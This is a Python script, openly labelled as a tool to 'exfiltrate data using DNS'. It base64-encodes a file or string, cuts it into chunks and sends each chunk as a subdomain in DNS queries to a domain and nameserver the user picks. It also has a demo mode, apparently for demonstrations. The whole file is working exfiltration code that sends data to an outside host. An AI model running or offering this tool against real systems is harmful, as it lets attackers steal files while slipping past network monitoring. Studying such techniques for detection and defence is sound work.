#!/bin/python3
import argparse
import os
import base64
import dns.resolver  # dnspython
import time

dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)


def valid_file(filename):
    print('Testing if %s is a file:  ' % filename, end='')
    if not os.path.exists(filename):
        print('No, it is not a file.')
        raise argparse.ArgumentTypeError('The file %s does not exist!' % filename)
    else:
        print('Yes, it is a file.')
        return filename


# argparse to get command-line flags
parser = argparse.ArgumentParser(description='Exfiltrate data using DNS.')
parser.add_argument('--filename', '--file', '-f', '-i', '--input',
                    type=valid_file, help='File to exfiltrate. (default: none)')
parser.add_argument('--blocksize', '-b', '-bs', type=int, choices=range(4, 64), default=12,
                    help='Size of blocks to encode. (default: 12)')
parser.add_argument('--domain', '-d', type=str, default='google.com',
                    help='Domain to use for tunneling. (default: google.com)')
parser.add_argument('--data', type=str,
                    help='Read data from the command line. (default: none)')
parser.add_argument('--type', '-t', type=str, choices=['A', 'TXT'], default='TXT',
                    help='Read data from the command line. (default: TXT)')
parser.add_argument('--nameserver', '-n', '-ns', type=str, default='8.8.8.8',
                    help='Nameserver to query. (default: 8.8.8.8)')
parser.add_argument('--verbose', '-v', action="store_true",
                    help='Verbose output. (default: none)')
parser.add_argument('--demo', action="store_true",
                    help='Demo mode. (default: none)')
args = parser.parse_args()


def main():
    if args.filename:
        # f = open(args.filename, 'r+')
        plaindata = open(args.filename, 'r').read().split('\n')
        # for line in f.readlines():
        fulldata = '\n'.join(plaindata)
    elif args.data:
        fulldata = args.data
    else:
        exit('666, no data found.')
    if fulldata:
        encodeddata = base64.b64encode(fulldata.encode('ascii')).decode('ascii')
        encodeddata = encodeddata.replace('=', '')
        sendqueries(encodeddata)


def sendqueries(b64data):
    blocksize = args.blocksize
    domain = args.domain
    type = args.type
    nameserver = args.nameserver
    dns.resolver.default_resolver.nameservers = [nameserver]
    b64array = [b64data[y-blocksize:y] for y in range(blocksize, len(b64data)+blocksize, blocksize)]
    print('We are sending', len(b64array), 'queries to fit all the data.')
    print('Using %s as our nameserver.' % nameserver)
    if args.demo:
        makedots(5)
    print('')
    counter = 1
    for word in b64array:
        queryname = word + '.' + domain
        print('Query %s %s %s' % (str(counter), queryname, type))
        if args.demo:
            makedots(3)
        try:
            result = dns.resolver.resolve(queryname, type)
        except dns.resolver.NXDOMAIN:
            print("Received NXDOMAIN answer")
            print('')
            continue
        except dns.resolver.NoAnswer:
            print("Received a blank answer to the query")
            print('')
            continue
        except:
            quit('666 There was an error with the DNS query')
        else:
            if args.verbose:
                print(str(result.response))
                print('')
            counter += 1


def makedots(sleepytime):
    for counter in range(0, sleepytime):
        print('. ', end = '')
        time.sleep(1)
    print('')


if __name__ == "__main__":
    main()
